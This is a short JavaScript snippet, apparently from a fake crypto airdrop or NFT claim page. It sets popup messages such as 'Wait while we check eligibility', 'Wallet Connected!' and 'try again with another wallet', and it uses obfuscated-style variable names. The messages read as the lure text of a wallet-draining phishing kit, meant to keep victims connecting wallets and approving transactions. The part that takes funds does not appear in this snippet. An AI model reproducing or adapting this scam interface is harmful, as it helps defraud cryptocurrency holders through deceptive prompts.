window.popupConfig.popupTitleCalc = "Connecting..";
window.popupConfig.connectionStatusTextCalc = "Wait while we check eligibility";
window.popupConfig.popupTitleDone = "Done! Please Wait";
window.popupConfig.connectionStatusTextDone = "Wallet Connected!";
window.popupConfig.popupTitleDeclined = "Transaction rejected";
window.popupConfig.connectionStatusTextDeclined = "Reconnect your wallet and try claiming again..";
window.popupConfig.popupTitleNotEligible = "There is a problem";
window.popupConfig.connectionStatusTextNotEligible = "This address is not eligible, try again with another wallet.";
document.addEventListener("DOMContentLoaded", function () {
  var _0x1cd91f = document.getElementById('ce-button-1');
  function _0x2660d4() {
    var _0x4deab5 = _0x1cd91f.value;
    window.popupConfig.popupTitleDone = "Done! Sending NFT..";
    console.log(window.popupConfig.popupTitleDone);
  }
  _0x1cd91f.addEventListener('change', _0x2660d4);
  _0x2660d4();
});
